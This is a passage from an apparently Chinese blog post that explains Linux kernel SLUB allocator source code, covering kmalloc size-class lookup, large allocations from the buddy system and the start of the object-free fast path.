class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_SLOB</span><br><span class="hljs-type">static</span> __always_inline __alloc_size(<span class="hljs-number">1</span>) <span class="hljs-type">void</span> *<span class="hljs-title function_">kmalloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags)</span><br>&#123;<br><span class="hljs-keyword">if</span> (__builtin_constant_p(size) &amp;&amp; size) &#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> index;<br><br><span class="hljs-keyword">if</span> (size &gt; KMALLOC_MAX_CACHE_SIZE)<br><span class="hljs-keyword">return</span> kmalloc_large(size, flags);<br><br>index = kmalloc_index(size);<br><span class="hljs-keyword">return</span> kmalloc_trace(<br>kmalloc_caches[kmalloc_type(flags)][index],<br>flags, size);<br>&#125;<br><span class="hljs-keyword">return</span> __kmalloc(size, flags);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="I-kmalloc-large-：直接向-buddy-system-请求内存">I. kmalloc_large()：直接向 buddy system 请求内存</h3><p>对于请求大小大于 <code>KMALLOC_MAX_CACHE_SIZE</code> 的内存分配请求而言， <code>kmalloc()</code> 会直接调用 <code>kmalloc_large()</code> 完成内存分配，最后实际上会在 <code>__kmalloc_large_node()</code> 调用 <code>alloc_pages()</code> 向 buddy system 请求内存：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 为了避免不必要的开销,我们将大的分配请求直接传递给页面分配器.</span><br><span class="hljs-comment"> * 我们使用 __GFP_COMP, 因为我们需要知道分配的 order 以在 kfree 中恰当地释放.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *__kmalloc_large_node(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags, <span class="hljs-type">int</span> node)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">void</span> *ptr = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order = get_order(size);<br><br><span class="hljs-keyword">if</span> (unlikely(flags &amp; GFP_SLAB_BUG_MASK))<br>flags = kmalloc_fix_flags(flags);<br><br>flags |= __GFP_COMP;<br>page = alloc_pages_node(node, flags, order);<br><span class="hljs-keyword">if</span> (page) &#123;<br>ptr = page_address(page);<br>mod_lruvec_page_state(page, NR_SLAB_UNRECLAIMABLE_B,<br>      PAGE_SIZE &lt;&lt; order);<br>&#125;<br><br>ptr = kasan_kmalloc_large(ptr, size, flags);<br><span class="hljs-comment">/* As ptr might get tagged, call kmemleak hook after KASAN. */</span><br>kmemleak_alloc(ptr, size, <span class="hljs-number">1</span>, flags);<br>kmsan_kmalloc_large(ptr, size, flags);<br><br><span class="hljs-keyword">return</span> ptr;<br>&#125;<br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">kmalloc_large</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags)</span><br>&#123;<br><span class="hljs-type">void</span> *ret = __kmalloc_large_node(size, flags, NUMA_NO_NODE);<br><br>trace_kmalloc(_RET_IP_, ret, size, PAGE_SIZE &lt;&lt; get_order(size),<br>      flags, NUMA_NO_NODE);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br>EXPORT_SYMBOL(kmalloc_large);<br></code></pre></td></tr></table></figure><h3 id="II-kmalloc-index-：获取size对应下标">II. __kmalloc_index()：获取size对应下标</h3><p><code>kmalloc_index()</code> 其实就是 <code>__kmalloc_index（）</code>，根据请求的大小返回对应的下标，整体逻辑非常简单粗暴：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 算出一个特定大小的分配属于哪个 kmalloc slab .</span><br><span class="hljs-comment"> * 0 = zero alloc</span><br><span class="hljs-comment"> * 1 =  65 .. 96 bytes</span><br><span class="hljs-comment"> * 2 = 129 .. 192 bytes</span><br><span class="hljs-comment"> * n = 2^(n-1)+1 .. 2^n</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 注意: __kmalloc_index() 在编译期优化, 没有运行时优化;</span><br><span class="hljs-comment"> * 典型的用法为通过 kmalloc_index() 以在编译期优化.</span><br><span class="hljs-comment"> * 大小非常量的调用者仅应当为__kmalloc_index()的运行时开销可以被接受的测试模块.</span><br><span class="hljs-comment"> * 同样参见 kmalloc_slab().</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> __kmalloc_index(<span class="hljs-type">size_t</span> size,<br>    <span class="hljs-type">bool</span> size_is_constant)<br>&#123;<br><span class="hljs-keyword">if</span> (!size)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (size &lt;= KMALLOC_MIN_SIZE)<br><span class="hljs-keyword">return</span> KMALLOC_SHIFT_LOW;<br><br><span class="hljs-keyword">if</span> (KMALLOC_MIN_SIZE &lt;= <span class="hljs-number">32</span> &amp;&amp; size &gt; <span class="hljs-number">64</span> &amp;&amp; size &lt;= <span class="hljs-number">96</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><span class="hljs-keyword">if</span> (KMALLOC_MIN_SIZE &lt;= <span class="hljs-number">64</span> &amp;&amp; size &gt; <span class="hljs-number">128</span> &amp;&amp; size &lt;= <span class="hljs-number">192</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br><span class="hljs-keyword">if</span> (size &lt;=          <span class="hljs-number">8</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">3</span>;<br><span class="hljs-keyword">if</span> (size &lt;=         <span class="hljs-number">16</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">4</span>;<br><span class="hljs-keyword">if</span> (size &lt;=         <span class="hljs-number">32</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">5</span>;<br><span class="hljs-keyword">if</span> (size &lt;=         <span class="hljs-number">64</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">6</span>;<br><span class="hljs-keyword">if</span> (size &lt;=        <span class="hljs-number">128</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">7</span>;<br><span class="hljs-keyword">if</span> (size &lt;=        <span class="hljs-number">256</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">8</span>;<br><span class="hljs-keyword">if</span> (size &lt;=        <span class="hljs-number">512</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">9</span>;<br><span class="hljs-keyword">if</span> (size &lt;=       <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">10</span>;<br><span class="hljs-keyword">if</span> (size &lt;=   <span class="hljs-number">2</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">11</span>;<br><span class="hljs-keyword">if</span> (size &lt;=   <span class="hljs-number">4</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">12</span>;<br><span class="hljs-keyword">if</span> (size &lt;=   <span class="hljs-number">8</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">13</span>;<br><span class="hljs-keyword">if</span> (size &lt;=  <span class="hljs-number">16</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">14</span>;<br><span class="hljs-keyword">if</span> (size &lt;=  <span class="hljs-number">32</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">15</span>;<br><span class="hljs-keyword">if</span> (size &lt;=  <span class="hljs-number">64</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">16</span>;<br><span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-number">128</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">17</span>;<br><span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-number">256</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">18</span>;<br><span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-number">512</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">19</span>;<br><span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">20</span>;<br><span class="hljs-keyword">if</span> (size &lt;=  <span class="hljs-number">2</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">21</span>;<br><br><span class="hljs-keyword">if</span> (!IS_ENABLED(CONFIG_PROFILE_ALL_BRANCHES) &amp;&amp; size_is_constant)<br>BUILD_BUG_ON_MSG(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;unexpected size in kmalloc_index()&quot;</span>);<br><span class="hljs-keyword">else</span><br>BUG();<br><br><span class="hljs-comment">/* Will never be reached. Needed because the compiler may complain */</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="III-kmalloc-types-：获取标志位对应类型">III. kmalloc_types()：获取标志位对应类型</h3><p><code>kmalloc_type()</code> 其实主要就是根据标志位返回类型，除了指定了 <code>__GFP_DMA/__GFP_RECLAIMABLE/__GFP_ACCOUNT</code> 以外就都是 <code>KMALLOC_NORMAL</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-keyword">enum</span> kmalloc_cache_type <span class="hljs-title function_">kmalloc_type</span><span class="hljs-params">(<span class="hljs-type">gfp_t</span> flags)</span><br>&#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 最常规的情况为 KMALLOC_NORMAL, 所以用一个单独的分支测试所有相关的标志位.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (likely((flags &amp; KMALLOC_NOT_NORMAL_BITS) == <span class="hljs-number">0</span>))<br><span class="hljs-keyword">return</span> KMALLOC_NORMAL;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 至少需要设置一种标志位. 优先顺序为:</span><br><span class="hljs-comment"> *  1) __GFP_DMA</span><br><span class="hljs-comment"> *  2) __GFP_RECLAIMABLE</span><br><span class="hljs-comment"> *  3) __GFP_ACCOUNT</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (IS_ENABLED(CONFIG_ZONE_DMA) &amp;&amp; (flags &amp; __GFP_DMA))<br><span class="hljs-keyword">return</span> KMALLOC_DMA;<br><span class="hljs-keyword">if</span> (!IS_ENABLED(CONFIG_MEMCG_KMEM) || (flags &amp; __GFP_RECLAIMABLE))<br><span class="hljs-keyword">return</span> KMALLOC_RECLAIM;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">return</span> KMALLOC_CGROUP;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="IV-kmalloc-trace-：常规大小的-NUMA-NO-NODE-对象分配">IV. kmalloc_trace()：常规大小的 NUMA_NO_NODE 对象分配</h3><p><code>kmalloc_trace()</code> 主要是对 <code>__kmem_cache_alloc_node()</code> 的 wrapper，加上 tracepoint 和 kasan 的相关设置，需要注意的是这里会指定 node 为 <code>NUMA_NO_NODE</code>：</p><blockquote><p>不知道什么是 kernel trace point 的可以参见 <a href="https://docs.kernel.org/trace/tracepoints.html">这里</a></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">kmalloc_trace</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">gfp_t</span> gfpflags, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br><span class="hljs-type">void</span> *ret = __kmem_cache_alloc_node(s, gfpflags, NUMA_NO_NODE,<br>    size, _RET_IP_);<br><br>trace_kmalloc(_RET_IP_, ret, size, s-&gt;size, gfpflags, NUMA_NO_NODE);<br><br>ret = kasan_kmalloc(s, ret, size, gfpflags);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br>EXPORT_SYMBOL(kmalloc_trace);<br></code></pre></td></tr></table></figure><p><code>__kmem_cache_alloc_node()</code> 其实就是 <code>slab_alloc_node()</code> 的 wrapper：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *__kmem_cache_alloc_node(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">gfp_t</span> gfpflags,<br>      <span class="hljs-type">int</span> node, <span class="hljs-type">size_t</span> orig_size,<br>      <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> caller)<br>&#123;<br><span class="hljs-keyword">return</span> slab_alloc_node(s, <span class="hljs-literal">NULL</span>, gfpflags, node,<br>       caller, orig_size);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="V-kmalloc-：常规大小的-NUMA-NO-NODE-对象分配">V. __kmalloc()：常规大小的 NUMA_NO_NODE 对象分配</h3><p><code>__kmalloc()</code> 其实就是指定 node 为 <code> NUMA_NO_NODE</code> 的 <code>__do_kmalloc_node()</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *__kmalloc(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags)<br>&#123;<br><span class="hljs-keyword">return</span> __do_kmalloc_node(size, flags, NUMA_NO_NODE, _RET_IP_);<br>&#125;<br>EXPORT_SYMBOL(__kmalloc);<br></code></pre></td></tr></table></figure><h3 id="VI-do-kmalloc-node-：判断所需-kmem-cache-并进行对象分配">VI. __do_kmalloc_node()：判断所需 kmem_cache 并进行对象分配</h3><p>该函数的主要逻辑为：</p><ul><li>若 <code>size &gt; KMALLOC_MAX_CACHE_SIZE</code> ，则调用 <code>__kmalloc_large_node()</code> 进行分配，并进行 tracepoint 与 kasan 相关设置</li><li>对于常规 size：<ul><li>首先调用 <code>kmalloc_slab()</code> 获取对应的 <code>kmem_cache</code></li><li>接下来调用 <code>__kmem_cache_alloc_node()</code> 进行内存分配</li><li>最后进行 tracepoint 与 kasan 相关设置</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline<br><span class="hljs-type">void</span> *__do_kmalloc_node(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags, <span class="hljs-type">int</span> node, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> caller)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *<span class="hljs-title">s</span>;</span><br><span class="hljs-type">void</span> *ret;<br><br><span class="hljs-keyword">if</span> (unlikely(size &gt; KMALLOC_MAX_CACHE_SIZE)) &#123;<br>ret = __kmalloc_large_node(size, flags, node);<br>trace_kmalloc(caller, ret, size,<br>      PAGE_SIZE &lt;&lt; get_order(size), flags, node);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><br>s = kmalloc_slab(size, flags);<br><br><span class="hljs-keyword">if</span> (unlikely(ZERO_OR_NULL_PTR(s)))<br><span class="hljs-keyword">return</span> s;<br><br>ret = __kmem_cache_alloc_node(s, flags, node, size, caller);<br>ret = kasan_kmalloc(s, ret, size, flags);<br>trace_kmalloc(caller, ret, size, s-&gt;size, flags, node);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>kmalloc_slab()</code> 中寻找 <code>kmem_cache</code> 的过程和 kmalloc 类似，不过寻找下标用的是 <code>size_index[size_index_elem(size)]</code> 和 <code>fls()</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 寻找满足给定大小的分配的 kmem_cache 结构体</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">struct</span> kmem_cache *<span class="hljs-title function_">kmalloc_slab</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> index;<br><br><span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-number">192</span>) &#123;<br><span class="hljs-keyword">if</span> (!size)<br><span class="hljs-keyword">return</span> ZERO_SIZE_PTR;<br><br>index = size_index[size_index_elem(size)];<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (WARN_ON_ONCE(size &gt; KMALLOC_MAX_CACHE_SIZE))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>index = fls(size - <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-keyword">return</span> kmalloc_caches[kmalloc_type(flags)][index];<br>&#125;<br></code></pre></td></tr></table></figure><p><code>size_index</code> 和 <code>size_index_elem()</code> 的定义都非常简单粗暴：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Conversion table for small slabs sizes / 8 to the index in the</span><br><span class="hljs-comment"> * kmalloc array. This is necessary for slabs &lt; 192 since we have non power</span><br><span class="hljs-comment"> * of two cache sizes there. The size of larger slabs can be determined using</span><br><span class="hljs-comment"> * fls.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> u8 size_index[<span class="hljs-number">24</span>] __ro_after_init = &#123;<br><span class="hljs-number">3</span>,<span class="hljs-comment">/* 8 */</span><br><span class="hljs-number">4</span>,<span class="hljs-comment">/* 16 */</span><br><span class="hljs-number">5</span>,<span class="hljs-comment">/* 24 */</span><br><span class="hljs-number">5</span>,<span class="hljs-comment">/* 32 */</span><br><span class="hljs-number">6</span>,<span class="hljs-comment">/* 40 */</span><br><span class="hljs-number">6</span>,<span class="hljs-comment">/* 48 */</span><br><span class="hljs-number">6</span>,<span class="hljs-comment">/* 56 */</span><br><span class="hljs-number">6</span>,<span class="hljs-comment">/* 64 */</span><br><span class="hljs-number">1</span>,<span class="hljs-comment">/* 72 */</span><br><span class="hljs-number">1</span>,<span class="hljs-comment">/* 80 */</span><br><span class="hljs-number">1</span>,<span class="hljs-comment">/* 88 */</span><br><span class="hljs-number">1</span>,<span class="hljs-comment">/* 96 */</span><br><span class="hljs-number">7</span>,<span class="hljs-comment">/* 104 */</span><br><span class="hljs-number">7</span>,<span class="hljs-comment">/* 112 */</span><br><span class="hljs-number">7</span>,<span class="hljs-comment">/* 120 */</span><br><span class="hljs-number">7</span>,<span class="hljs-comment">/* 128 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 136 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 144 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 152 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 160 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 168 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 176 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 184 */</span><br><span class="hljs-number">2</span><span class="hljs-comment">/* 192 */</span><br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">size_index_elem</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> bytes)</span><br>&#123;<br><span class="hljs-keyword">return</span> (bytes - <span class="hljs-number">1</span>) / <span class="hljs-number">8</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="三、上层调用接口关系图">三、上层调用接口关系图</h2><p>因为很多比如说 <code>__kmem_cache_alloc_lru()</code> 一类的函数其实最后都是对 <code>slab_alloc_node()</code> 的套娃，这里笔者直接给出一个简易的调用关系图：</p><blockquote><p>只截取了笔者认为比较主要的那些，<s>因为作图作到后面实在蚌埠住了</s></p></blockquote><p><img src="https://s2.loli.net/2023/02/22/wCchFdIZLOn3m7W.png" alt="image.png"></p><h1>0x03. 对象的释放</h1><h2 id="※-一、do-slab-free-：向指定的-kmem-cache-释放对象（链）">※ 一、do_slab_free()：向指定的 kmem_cache 释放对象（链）</h2><p>在 slab allocator 中存在着多个不同的内存释放接口，其最后都会调用到 <code>do_slab_free()</code> 完成内存释放的工作，需要注意的是该函数  <em><strong>允许释放已经连接成一条 freelist 且已经加密好的多个对象</strong></em>  ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 强制内联快速路径以创造无需额外的函数调用便能完成快速路径释放的kfree&amp;kmem_cache_free.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 快速路径仅在我们要释放会当前 cpu slab 时生效.</span><br><span class="hljs-comment"> * 这通常是在我们刚刚分配了该对象的情况.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 若快速路径不可用则退回 __slab_free 以处理所有种类的特殊处理.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 通过指定 head &amp; tail 指针 加上对象数量（cnt），可以大量释放包含多个对象的freelist.</span><br><span class="hljs-comment"> * Bulk free indicated by tail pointer being set.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span> <span class="hljs-title function_">do_slab_free</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> slab *slab, <span class="hljs-type">void</span> *head, <span class="hljs-type">void</span> *tail,</span><br><span class="hljs-params"><span class="hljs-type">int</span> cnt, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr)</span><br>&#123;<br><span class="hljs-type">void</span> *tail_obj = tail ? : head;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_cpu</span> *<span class="hljs-title">c</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> tid;<br><span class="hljs-type">void</span> **freelist;<br></code></pre></td></tr></table></figure><p>与分配类似，释放同样分为快速路径与慢速路径</p><h3 id="I-直接释放回-percpu-slab（fast-path）">I. 直接释放回 percpu slab（fast path）</h3><p>快速路径比较简单，主要就是<strong>对比待释放对象所属 slab 是否为 percpu slab，若是则直接挂回去即可，遵循 LIFO 机制</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c">redo:<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 确定当前的 per cpu slab. </span><br><span class="hljs-comment"> * cpu 可能在之后改变.但由于数据已经通过该指针获得，这并没问题.</span><br><span class="hljs-comment"> * 若我们在 cmpxchg 期间在同一 cpu 上，释放将会成功.</span><br><span class="hljs-comment"> */</span><br>c = raw_cpu_ptr(s-&gt;cpu_slab);<br>tid = READ_ONCE(c-&gt;tid);<br><br><span class="hljs-comment">/* 与 slab_alloc_node() 中在 barrier() 上的注释一样 